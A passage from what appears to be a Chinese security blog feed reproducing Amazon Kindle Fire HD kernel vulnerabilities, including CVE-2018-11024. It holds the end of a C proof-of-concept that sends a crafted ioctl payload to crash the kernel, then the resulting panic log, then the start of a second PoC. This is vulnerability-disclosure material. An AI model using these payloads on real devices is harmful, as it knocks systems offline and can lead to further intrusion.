class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0x00002020</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xeddad33f</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0xf16c7d8e</span>,</span><br><span class="line">    <span class="number">0x96489dd1</span>,</span><br><span class="line">    <span class="number">0x678a12ff</span>,</span><br><span class="line">    <span class="number">0x69812204</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  381.205780] Unable to handle kernel NULL pointer dereference at virtual address 00000004</span><br><span class="line">[  381.215637] pgd &#x3D; c30e4000</span><br><span class="line">[  381.219085] [00000004] *pgd&#x3D;97437831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">[  381.227355] Internal error: Oops: 817 [#1] PREEMPT SMP ARM</span><br><span class="line">[  381.233520] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  381.241302] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  381.248596] PC is at free_buffer+0x4c&#x2F;0x13c</span><br><span class="line">[  381.253479] LR is at down_timeout+0x40&#x2F;0x5c</span><br><span class="line">[  381.258209] pc : [&lt;c031716c&gt;]    lr : [&lt;c006e9b8&gt;]    psr: a0000013</span><br><span class="line">[  381.258209] sp : de943e58  ip : de943e38  fp : de943e6c</span><br><span class="line">[  381.271179] r10: 00000000  r9 : dd3e8ca8  r8 : c25e6598</span><br><span class="line">[  381.277160] r7 : eddad327  r6 : de942000  r5 : c0a25b50  r4 : c25e6580</span><br><span class="line">[  381.284454] r3 : 00000000  r2 : c0a25b64  r1 : c0a25b64  r0 : 00000000</span><br><span class="line">[  381.291870] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  381.299804] Control: 10c5387d  Table: 830e404a  DAC: 00000015</span><br><span class="line">[  381.306335] </span><br><span class="line">[  381.306365] PC: 0xc03170ec:</span><br><span class="line">[  381.311340] 70ec  e1a00001 e34c2091 e3a01a01 e30531e8 e34c306e ebfd3650 e89da800 e1a0c00d</span><br><span class="line">[  381.321868] 710c  e92dd800 e24cb004 ebffced4 e3a00000 e89da800 e1a0c00d e92dd830 e24cb004</span><br><span class="line">[  381.332550] 712c  e1a04000 e3020710 e59f510c ebf4dd18 e1a01000 e1a00005 ebf55e0b e3500000</span><br><span class="line">[  381.343078] 714c  1a000023 e5943000 e1540003 0a000008 e1a02005 e5940004 e5b21014 e5853014</span><br><span class="line">[  381.353759] 716c  e5832004 e5801000 e5810004 e5844000 e5844004 e59f00c0 ebf55d9f e3020710</span><br><span class="line">[  381.364440] 718c  e59f50b4 ebf4dd02 e1a01000 e285001c ebf55df5 e3500000 1a00001a e594201c</span><br><span class="line">[  381.375122] 71ac  e1a03005 e594c018 e2841018 e285001c e58c2004 e582c000 e5b32030 e5851030</span><br><span class="line">[  381.385681] 71cc  e5821004 e5842018 e584301c ebf55d8a e89da830 e1a03000 e3a02068 e59f105c</span><br><span class="line">[  381.396331] </span><br><span class="line">[  381.396362] LR: 0xc006e938:</span><br><span class="line">[  381.401306] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005</span><br><span class="line">[  381.411987] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4</span><br><span class="line">[  381.422668] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000</span><br><span class="line">[  381.433288] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794</span><br><span class="line">[  381.443817] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d</span><br><span class="line">[  381.454498] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008</span><br><span class="line">[  381.465179] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004</span><br><span class="line">[  381.475830] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d</span><br><span class="line">[  381.486358] </span><br><span class="line">[  381.486358] SP: 0xde943dd8:</span><br><span class="line">[  381.491455] 3dd8  de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff</span><br><span class="line">[  381.501983] 3df8  de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64</span><br><span class="line">[  381.512664] 3e18  c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8</span><br><span class="line">[  381.523315] 3e38  00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff</span><br><span class="line">[  381.533996] 3e58  00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028</span><br><span class="line">[  381.544525] 3e78  be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90</span><br><span class="line">[  381.555206] 3e98  de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141</span><br><span class="line">[  381.565734] 3eb8  41414141 41414141 41414141 41414141 41414141 d7b96700 de943efc de943ee0</span><br><span class="line">[  381.576293] </span><br><span class="line">[  381.576293] IP: 0xde943db8:</span><br><span class="line">[  381.581390] 3db8  de943dd4 de943dc8 c00795b4 c00792bc de943e0c de943dd8 c0070df8 c00795ac</span><br><span class="line">[  381.592071] 3dd8  de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff</span><br><span class="line">[  381.602630] 3df8  de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64</span><br><span class="line">[  381.613311] 3e18  c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8</span><br><span class="line">[  381.623870] 3e38  00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff</span><br><span class="line">[  381.634399] 3e58  00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028</span><br><span class="line">[  381.645080] 3e78  be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90</span><br><span class="line">[  381.655761] 3e98  de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141</span><br><span class="line">[  381.666442] </span><br><span class="line">[  381.666442] FP: 0xde943dec:</span><br><span class="line">[  381.671417] 3dec  c031716c a0000013 ffffffff de943e44 c25e6598 de943e6c de943e10 c06a5318</span><br><span class="line">[  381.681976] 3e0c  c0008370 00000000 c0a25b64 c0a25b64 00000000 c25e6580 c0a25b50 de942000</span><br><span class="line">[  381.692535] 3e2c  eddad327 c25e6598 dd3e8ca8 00000000 de943e6c de943e38 de943e58 c006e9b8</span><br><span class="line">[  381.703216] 3e4c  c031716c a0000013 ffffffff 00000000 be8075c8 de943f04 de943e70 c0317704</span><br><span class="line">[  381.713867] 3e6c  c031712c 00000001 00000028 be8075c8 de943ea0 de943e98 de943e90 c0207454</span><br><span class="line">[  381.724548] 3e8c  c00bd920 de943e90 de943e90 de943e98 de943e98 00000000 00000002 00000002</span><br><span class="line">[  381.735076] 3eac  eddad33f 41414141 41414141 41414141 41414141 41414141 41414141 41414141</span><br><span class="line">[  381.745758] 3ecc  d7b96700 de943efc de943ee0 c02089fc 00000000 d74f9540 00000004 d74f9540</span><br><span class="line">[  381.756408] </span><br><span class="line">[  381.756408] R1: 0xc0a25ae4:</span><br><span class="line">[  381.761383] 5ae4  00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff</span><br><span class="line">[  381.772064] 5b04  00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  381.782714] 5b24  00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101</span><br><span class="line">[  381.793273] 5b44  3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c</span><br><span class="line">[  381.803955] 5b64  00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80</span><br><span class="line">[  381.814605] 5b84  c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c</span><br><span class="line">[  381.825286] 5ba4  00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0</span><br><span class="line">[  381.835815] 5bc4  c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.846496] </span><br><span class="line">[  381.846496] R2: 0xc0a25ae4:</span><br><span class="line">[  381.851470] 5ae4  00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff</span><br><span class="line">[  381.862152] 5b04  00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  381.872802] 5b24  00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101</span><br><span class="line">[  381.883453] 5b44  3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c</span><br><span class="line">[  381.893981] 5b64  00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80</span><br><span class="line">[  381.904663] 5b84  c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c</span><br><span class="line">[  381.915344] 5ba4  00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0</span><br><span class="line">[  381.925872] 5bc4  c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.936523] </span><br><span class="line">[  381.936523] R4: 0xc25e6500:</span><br><span class="line">[  381.941619] 6500  00000002 00000000 d7a55550 00000000 00000000 00000000 c2410c00 000008a8</span><br><span class="line">[  381.952148] 6520  c0a10a88 00000000 c16281fc 00000000 00000000 00000000 00000000 000003e8</span><br><span class="line">[  381.962829] 6540  c25e6000 00000093 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.973480] 6560  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.984008] 6580  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.994689] 65a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.005340] 65c0  00000000 00000028 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.016021] 65e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.026519] </span><br><span class="line">[  382.026519] R5: 0xc0a25ad0:</span><br><span class="line">[  382.031616] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03</span><br><span class="line">[  382.042175] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  382.052856] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001</span><br><span class="line">[  382.063507] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001</span><br><span class="line">[  382.074157] 5b50  00000000 00000000 00000000 c0a25b5c c0a25b5c 00000000 c0a25b64 00000000</span><br><span class="line">[  382.084716] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000</span><br><span class="line">[  382.095245] 5b90  00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001</span><br><span class="line">[  382.105926] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8</span><br><span class="line">[  382.116577] </span><br><span class="line">[  382.116577] R6: 0xde941f80:</span><br><span class="line">[  382.121551] 1f80  de917b80 c00635cc 00000013 de84190c de917b80 c00635cc 00000013 00000000</span><br><span class="line">[  382.132202] 1fa0  00000000 00000000 de941ff4 de941fb8 c0068af4 c00635d8 00000000 00000000</span><br><span class="line">[  382.142730] 1fc0  de917b80 00000000 00000000 00000000 de941fd0 de941fd0 00000000 de84190c</span><br><span class="line">[  382.153259] 1fe0  c0068a64 c004cd64 00000000 de941ff8 c004cd64 c0068a70 00000000 00000000</span><br><span class="line">[  382.163940] 2000  00000000 00000002 00000000 dd0bd7c0 c0a0e840 00000000 00000015 c2de6540</span><br><span class="line">[  382.174621] 2020  00000000 de942000 c09ddc50 dd0bd7c0 de83d300 c1617b40 de943ba4 de943af0</span><br><span class="line">[  382.185150] 2040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  382.195800] 2060  01c454c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.206451] </span><br><span class="line">[  382.206451] R7: 0xeddad2a7:</span><br><span class="line">[  382.211425] d2a4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.222106] d2c4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.232788] d2e4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.243316] d304  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.253997] d324  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.264678] d344  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.275238] d364  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.286071] d384  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.296752] d3a4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.307434] </span><br><span class="line">[  382.307434] R8: 0xc25e6518:</span><br><span class="line">[  382.312408] 6518  c2410c00 000008a8 c0a10a88 00000000 c16281fc 00000000 00000000 00000000</span><br><span class="line">[  382.323059] 6538  00000000 000003e8 c25e6000 00000093 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.333587] 6558  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.344268] 6578  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.354919] 6598  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.365600] 65b8  00000000 00000000 00000000 00000028 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.376129] 65d8  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.386779] 65f8  00000000 00000000 00000093 00000093 0000004d 00000002 00000000 00000000</span><br><span class="line">[  382.397308] </span><br><span class="line">[  382.397338] R9: 0xdd3e8c28:</span><br><span class="line">[  382.402282] 8c28  dd3e8c28 dd3e8c28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  382.412933] 8c48  00000000 00000000 dd3e8c50 dd3e8c50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  382.423614] 8c68  5aefce7f 00000000 00000000 00000000 dd3e8c80 00000000 00000000 00000000</span><br><span class="line">[  382.434112] 8c88  00200000 00000000 00000000 dd3e8c94 dd3e8c94 dd3d2380 dd3d2380 00000000</span><br><span class="line">[  382.444793] 8ca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd154400</span><br><span class="line">[  382.455322] 8cc8  dd3e8d80 dd35ce70 00001064 00000001 0fb00000 5aefce7f 2cb41780 5aefce7f</span><br><span class="line">[  382.466003] 8ce8  2cb41780 5aefce7f 2cb41780 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.476531] 8d08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3e8d24</span><br><span class="line">[  382.487182] Process gcioctl_poc_2 (pid: 4073, stack limit &#x3D; 0xde9422f8)</span><br><span class="line">[  382.494689] Stack: (0xde943e58 to 0xde944000)</span><br><span class="line">[  382.499603] 3e40:                                                       00000000 be8075c8</span><br><span class="line">[  382.508819] 3e60: de943f04 de943e70 c0317704 c031712c 00000001 00000028 be8075c8 de943ea0</span><br><span class="line">[  382.517913] 3e80: de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90 de943e98 de943e98</span><br><span class="line">[  382.527130] 3ea0: 00000000 00000002 00000002 eddad33f 41414141 41414141 41414141 41414141</span><br><span class="line">[  382.536346] 3ec0: 41414141 41414141 41414141 d7b96700 de943efc de943ee0 c02089fc 00000000</span><br><span class="line">[  382.545562] 3ee0: d74f9540 00000004 d74f9540 be8075c8 dd3e8ca8 00000000 de943f74 de943f08</span><br><span class="line">[  382.554656] 3f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  382.563873] 3f20: dcf8c770 de943f0c de942000 be807638 be8075c8 c02c5d6d d74f9540 00000004</span><br><span class="line">[  382.573120] 3f40: de942000 00000000 de943f64 00000000 be8075c8 c02c5d6d d74f9540 00000004</span><br><span class="line">[  382.582183] 3f60: de942000 00000000 de943fa4 de943f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  382.591430] 3f80: 00000400 be807638 00010e64 00000000 00000036 c0013e08 00000000 de943fa8</span><br><span class="line">[  382.600646] 3fa0: c0013c60 c0136578 be807638 00010e64 00000004 c02c5d6d be8075c8 be8075c8</span><br><span class="line">[  382.609863] 3fc0: be807638 00010e64 00000000 00000036 00000000 00000000 00000000 be807624</span><br><span class="line">[  382.618927] 3fe0: 00000000 be8075ac 000106a0 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[  382.628143] Backtrace: </span><br><span class="line">[  382.631164] [&lt;c0317120&gt;] (free_buffer+0x0&#x2F;0x13c) from [&lt;c0317704&gt;] (dev_ioctl+0x2c8&#x2F;0x10c4)</span><br><span class="line">[  382.640563]  r5:be8075c8 r4:00000000</span><br><span class="line">[  382.644958] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  382.654388] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  382.663604] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  382.673004]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:be807638</span><br><span class="line">[  382.681304] Code: e1a02005 e5940004 e5b21014 e5853014 (e5832004) </span><br><span class="line">[  382.697326] Board Information: </span><br><span class="line">[  382.697357]  Revision : 0001</span><br><span class="line">[  382.697357]  Serial	: 0000000000000000</span><br><span class="line">[  382.697387] SoC Information:</span><br><span class="line">[  382.697387]  CPU	: OMAP4470</span><br><span class="line">[  382.697418]  Rev	: ES1.0</span><br><span class="line">[  382.697418]  Type	: HS</span><br><span class="line">[  382.697418]  Production ID: 0002B975-000000CC</span><br><span class="line">[  382.697448]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  382.697448] </span><br><span class="line">[  382.733703] ---[ end trace 58e760c9cd2996a9 ]---</span><br><span class="line">[  382.739074] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  382.744964] CPU1: stopping</span><br><span class="line">[  382.748229] Backtrace: </span><br><span class="line">[  382.751251] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  382.760742]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[  382.767761] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  382.777008] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  382.786499] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  382.795684] Exception stack(0xde885e98 to 0xde885ee0)</span><br><span class="line">[  382.801483] 5e80:                                                       de885ee0 0000d120</span><br><span class="line">[  382.810577] 5ea0: 1ce88a9c 00000059 1cc00792 00000059 c161e498 00000000 c09ece64 de960480</span><br><span class="line">[  382.819793] 5ec0: c0ad01c8 de885f0c 0000017e de885ee0 c008e350 c0431ae0 600f0013 ffffffff</span><br><span class="line">[  382.829010]  r6:ffffffff r5:600f0013 r4:c0431ae0 r3:c008e350</span><br><span class="line">[  382.836029] [&lt;c0431a90&gt;] (cpuidle_wrap_enter+0x0&#x2F;0x9c) from [&lt;c04310c0&gt;] (cpuidle_enter_tk+0x18&#x2F;0x1c)</span><br><span class="line">[  382.846374]  r7:00000000 r6:c161e498 r5:c161e498 r4:de96048c</span><br><span class="line">[  382.853515] [&lt;c04310a8&gt;] (cpuidle_enter_tk+0x0&#x2F;0x1c) from [&lt;c04315dc&gt;] (cpuidle_enter_state+0x1c&#x2F;0x78)</span><br><span class="line">[  382.863983] [&lt;c04315c0&gt;] (cpuidle_enter_state+0x0&#x2F;0x78) from [&lt;c04334b8&gt;] (cpuidle_enter_state_coupled+0x13c&#x2F;0x36c)</span><br><span class="line">[  382.875518]  r6:de884000 r5:c161e498 r4:de96048c r3:00000000</span><br><span class="line">[  382.882659] [&lt;c043337c&gt;] (cpuidle_enter_state_coupled+0x0&#x2F;0x36c) from [&lt;c043176c&gt;] (cpuidle_idle_call+0x134&#x2F;0x31c)</span><br><span class="line">[  382.894256] [&lt;c0431638&gt;] (cpuidle_idle_call+0x0&#x2F;0x31c) from [&lt;c0015294&gt;] (cpu_idle+0xa4&#x2F;0x10c)</span><br><span class="line">[  382.903961] [&lt;c00151f0&gt;] (cpu_idle+0x0&#x2F;0x10c) from [&lt;c0695650&gt;] (secondary_start_kernel+0x118&#x2F;0x13c)</span><br><span class="line">[  382.914093] [&lt;c0695538&gt;] (secondary_start_kernel+0x0&#x2F;0x13c) from [&lt;80694ff4&gt;] (0x80694ff4)</span><br><span class="line">[  382.923400]  r6:10c0387d r5:00000015 r4:9e84c06a r3:c0694fdc</span><br><span class="line">[  382.930603] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[  382.934661] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[  382.938720] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[  382.942901] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[  382.946960] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[  382.951019] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[  382.955200] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[  382.959259] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[  382.963317] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[  382.967376] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[  382.971557] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[  382.975616] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[  382.979675] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[  382.983856] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[  382.987915] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[  382.991973] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[  382.996154] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[  383.000213] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[  383.004272] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[  383.008453] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[  383.012512] </span><br><span class="line">[  383.014312] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  383.014312] </span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11024%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令1077435789并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;	  //strlen</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt; //inet_addr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;	  //write</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> src_id;</span><br><span class="line">	<span class="keyword">int</span> dst_id;</span><br><span class="line">	<span 